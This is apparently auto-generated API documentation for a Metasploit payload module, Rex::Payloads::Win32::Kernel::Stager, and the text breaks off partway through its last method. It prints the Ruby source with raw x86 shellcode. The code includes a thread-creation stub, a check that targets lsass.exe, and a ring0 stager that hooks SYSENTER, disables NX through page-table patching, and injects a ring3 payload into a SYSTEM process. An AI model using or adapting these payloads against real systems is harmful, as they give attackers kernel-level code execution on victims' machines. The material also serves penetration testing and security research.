<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  Module: Rex::Payloads::Win32::Kernel::Stager
  
    &mdash; Documentation by YARD 0.9.26
  
</title>

  <link rel="stylesheet" href="../../../../css/style.css" type="text/css" />

  <link rel="stylesheet" href="../../../../css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "Rex::Payloads::Win32::Kernel::Stager";
  relpath = '../../../../';
</script>


  <script type="text/javascript" charset="utf-8" src="../../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../../js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="../../../../class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="../../../../_index.html">Index (S)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../../Rex.html" title="Rex (module)">Rex</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Payloads.html" title="Rex::Payloads (module)">Payloads</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Win32.html" title="Rex::Payloads::Win32 (module)">Win32</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Kernel.html" title="Rex::Payloads::Win32::Kernel (module)">Kernel</a></span></span>
     &raquo; 
    <span class="title">Stager</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../../class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><h1>Module: Rex::Payloads::Win32::Kernel::Stager
  
  
  
</h1>
<div class="box_info">
  

  
  
  
  
  

  

  
  <dl>
    <dt>Defined in:</dt>
    <dd>lib/rex/payloads/win32/kernel/stager.rb</dd>
  </dl>
  
</div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>Stagers are responsible for reading in another payload and executing it. The reading in of the payload may actually be as simple as copying it to another location.  The executing of it may be done either directly or indirectly.</p>


  </div>
</div>
<div class="tags">
  

</div>






  
    <h2>
      Class Method Summary
      <small><a href="#" class="summary_toggle">collapse</a></small>
    </h2>

    <ul class="summary">
      
        <li class="protected ">
  <span class="summary_signature">
    
      <a href="#_createthread-class_method" title="_createthread (class method)">.<strong>_createthread</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  <span class="note title protected">protected</span>
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Stub to run a prepended ring3 payload in a new thread.</p>
</div></span>
  
</li>

      
        <li class="protected ">
  <span class="summary_signature">
    
      <a href="#_run_only_in_win32proc_stub-class_method" title="_run_only_in_win32proc_stub (class method)">.<strong>_run_only_in_win32proc_stub</strong>(append = &#39;&#39;, opts = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  <span class="note title protected">protected</span>
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>This stub is used by stagers to check to see if the code is running in the context of a user-mode system process.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#stager_sysenter_hook-class_method" title="stager_sysenter_hook (class method)">.<strong>stager_sysenter_hook</strong>(opts = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Works on Vista, Server 2008 and 7.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#sud_syscall_hook-class_method" title="sud_syscall_hook (class method)">.<strong>sud_syscall_hook</strong>(opts = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>XP SP2/2K3 SP1 ONLY.</p>
</div></span>
  
</li>

      
    </ul>
  



  <div id="class_method_details" class="method_details_list">
    <h2>Class Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="_createthread-class_method">
  
    .<strong>_createthread</strong>  &#x21d2; <tt>Object</tt>  <span class="extras">(protected)</span>
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Stub to run a prepended ring3 payload in a new thread.</p>

<p>Full assembly source at:</p>

<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_external'>external</span><span class='op'>/</span><span class='id identifier rubyid_source'>source</span><span class='op'>/</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='op'>/</span><span class='id identifier rubyid_windows'>windows</span><span class='op'>/</span><span class='id identifier rubyid_x86'>x86</span><span class='op'>/</span><span class='id identifier rubyid_src'>src</span><span class='op'>/</span><span class='id identifier rubyid_single'>single</span><span class='op'>/</span><span class='id identifier rubyid_createthread'>createthread</span><span class='period'>.</span><span class='id identifier rubyid_asm'>asm</span>
</code></pre>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


132
133
134
135
136
137
138
139
140
141
142
143
144</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 132</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid__createthread'>_createthread</span>
  <span class='id identifier rubyid_r3'>r3</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x31\xC0\x50\x50\x50\x8D\x9D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x99\x00\x00\x00\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5\xC3\x58</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>return</span> <span class='id identifier rubyid_r3'>r3</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="_run_only_in_win32proc_stub-class_method">
  
    .<strong>_run_only_in_win32proc_stub</strong>(append = &#39;&#39;, opts = {})  &#x21d2; <tt>Object</tt>  <span class="extras">(protected)</span>
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>This stub is used by stagers to check to see if the code is running in the context of a user-mode system process.  By default, this process is lsass.exe.  If it isn&#39;t, it runs the code specified by append.  Otherwise, it jumps past that code and into what should be the expected r3 payload to execute.  This stub also makes sure that the payload does not run more than once.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 155</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid__run_only_in_win32proc_stub'>_run_only_in_win32proc_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_append'>append</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>lsass.exe</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>

  <span class='id identifier rubyid_process'>process</span>  <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span>
  <span class='id identifier rubyid_checksum'>checksum</span> <span class='op'>=</span>
    <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>         <span class='op'>+</span>
    <span class='lparen'>(</span><span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>8</span><span class='rparen'>)</span>  <span class='op'>+</span>
    <span class='lparen'>(</span><span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>16</span><span class='rparen'>)</span> <span class='op'>+</span>
    <span class='lparen'>(</span><span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>24</span><span class='rparen'>)</span>

  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x60</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># pusha
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6A\x30</span><span class='tstring_end'>&quot;</span></span>                             <span class='op'>+</span> <span class='comment'># push byte +0x30
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># pop eax
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x99</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># cdq
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x64\x8B\x18</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov ebx,[fs:eax]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x39\x53\x0C</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># cmp [ebx+0xc],edx
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x26</span><span class='tstring_end'>&quot;</span></span>                             <span class='op'>+</span> <span class='comment'># jz 0x5f
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x5B\x10</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov ebx,[ebx+0x10]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x5B\x3C</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov ebx,[ebx+0x3c]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x83\xC3\x28</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># add ebx,byte +0x28
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x0B</span><span class='tstring_end'>&quot;</span></span>                             <span class='op'>+</span> <span class='comment'># mov ecx,[ebx]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x03\x4B\x03</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># add ecx,[ebx+0x3]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x81\xF9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lbracket'>[</span><span class='id identifier rubyid_checksum'>checksum</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>      <span class='op'>+</span> <span class='comment'># cmp ecx,prochash
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\x10</span><span class='tstring_end'>&quot;</span></span>                             <span class='op'>+</span> <span class='comment'># jnz 0x5f
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x64\x8B\x18</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov ebx,[fs:eax]
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x43</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># inc ebx
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x43</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># inc ebx
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x43</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># inc ebx
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x80\x3B\x01</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># cmp byte [ebx],0x1
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x05</span><span class='tstring_end'>&quot;</span></span>                             <span class='op'>+</span> <span class='comment'># jz 0x5f
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xC6\x03\x01</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov byte [ebx],0x1
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xEB</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lbracket'>[</span><span class='id identifier rubyid_append'>append</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>+</span> <span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>C</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='comment'># jmp stager
</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x61</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_append'>append</span>						        <span class='comment'># restore regs
</span><span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="stager_sysenter_hook-class_method">
  
    .<strong>stager_sysenter_hook</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Works on Vista, Server 2008 and 7.</p>

<p>Full assembly source at: /msf3/external/source/shellcode/windows/x86/src/kernel/stager_sysenter_hook.asm</p>

<p>This payload works as follows:</p>
<ul><li>
<p>Our sysenter handler and ring3 stagers are copied over to safe location.</p>
</li><li>
<p>The SYSENTER_EIP_MSR is patched to point to our sysenter handler.</p>
</li><li>
<p>The ring0 thread we are in is placed in a halted state.</p>
</li><li>
<p>Upon any ring3 proces issuing a sysenter command our ring0 sysenter handler gets control.</p>
</li><li>
<p>The ring3 return address is modified to force our ring3 stub to be called if certain conditions met.</p>
</li><li>
<p>If NX is enabled we patch the respective page table entry to disable it for the ring3 code.</p>
</li><li>
<p>Control is passed to real sysenter handler, upon the real sysenter handler finishing, sysexit will return to our ring3 stager.</p>
</li><li>
<p>If the ring3 stager is executing in the desired process our sysenter handler is removed and the real ring3 payload called.</p>
</li></ul>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 31</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_stager_sysenter_hook'>stager_sysenter_hook</span><span class='lparen'>(</span> <span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span> <span class='rparen'>)</span>

  <span class='comment'># The page table entry for StagerAddressUser, used to bypass NX in ring3 on PAE enabled systems (should be static).
</span>  <span class='id identifier rubyid_pagetable'>pagetable</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>StagerAddressPageTable</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='int'>0xC03FFF00</span>

  <span class='comment'># The address in kernel memory where we place our ring0 and ring3 stager (no ASLR).
</span>  <span class='id identifier rubyid_kstager'>kstager</span>   <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>StagerAddressKernel</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='int'>0xFFDF0400</span>

  <span class='comment'># The address in shared memory (addressable from ring3) where we can find our ring3 stager (no ASLR).
</span>  <span class='id identifier rubyid_ustager'>ustager</span>   <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>StagerAddressUser</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='int'>0x7FFE0400</span>

  <span class='comment'># Target SYSTEM process to inject ring3 payload into.
</span>  <span class='id identifier rubyid_process'>process</span>   <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>lsass.exe</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>

  <span class='comment'># A simple hash of the process name based on the first 4 wide chars.
</span>  <span class='comment'># Assumes process is located at &#39;*:\windows\system32\&#39;.
</span>  <span class='id identifier rubyid_checksum'>checksum</span>  <span class='op'>=</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>8</span> <span class='rparen'>)</span>  <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>16</span> <span class='rparen'>)</span> <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>24</span> <span class='rparen'>)</span>

  <span class='comment'># The ring0 -&gt; ring3 payload blob.
</span>  <span class='comment'># Full assembly source at:
</span>  <span class='comment'>#   external/source/shellcode/windows/x86/src/kernel/stager_sysenter_hook.asm
</span>  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x5D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x7E\x61\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xEB\xFD\xE8\xDD\xFF\xFF\xFF\x6A\x00\x9C\x60\xE8\x00\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58\x8B\x58\x54\x89\x5C\x24\x24\x81\xF9\xDE\xC0\xAD\xDE\x75\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x76\x01\x00\x00\x59\x89\xD8\x31\xD2\x0F\x30\x31\xC0\xEB\x31</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x32\x0F\xB6\x1E\x66\x81\xFB\xC3\x00\x75\x25\x8B\x58\x5C\x8D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5B\x69\x89\x1A\xB8\x01\x00\x00\x80\x0F\xA2\x81\xE2\x00\x00\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x74\x0E\xBA\x45\x45\x45\x45\x83\xC2\x04\x81\x22\xFF\xFF\xFF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7F\x61\x9D\xC3\xFF\xFF\xFF\xFF\x42\x42\x42\x42\x43\x43\x43\x43</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x60\x6A\x30\x58\x99\x64\x8B\x18\x39\x53\x0C\x74\x2B\x8B\x43\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9\x44\x44\x44</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x75\x15\xE8\x07\x00\x00\x00\xE8\x0D\x00\x00\x00\xEB\x09\xB9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3</span><span class='tstring_end'>&quot;</span></span>

  <span class='comment'># The ring3 payload.
</span>  <span class='id identifier rubyid_r3'>r3</span>  <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
  <span class='id identifier rubyid_r3'>r3</span> <span class='op'>+=</span> <span class='id identifier rubyid__createthread'>_createthread</span><span class='lparen'>(</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CreateThread</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span>
  <span class='id identifier rubyid_r3'>r3</span> <span class='op'>+=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>UserModeStub</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

  <span class='comment'># Patch in the required values.
</span>  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span> <span class='lbracket'>[</span> <span class='int'>0x41414141</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='lparen'>(</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>+</span> <span class='id identifier rubyid_r3'>r3</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='int'>0x1C</span> <span class='rparen'>)</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='rparen'>)</span>
  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span> <span class='lbracket'>[</span> <span class='int'>0x42424242</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_kstager'>kstager</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='rparen'>)</span>
  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span> <span class='lbracket'>[</span> <span class='int'>0x43434343</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_ustager'>ustager</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='rparen'>)</span>
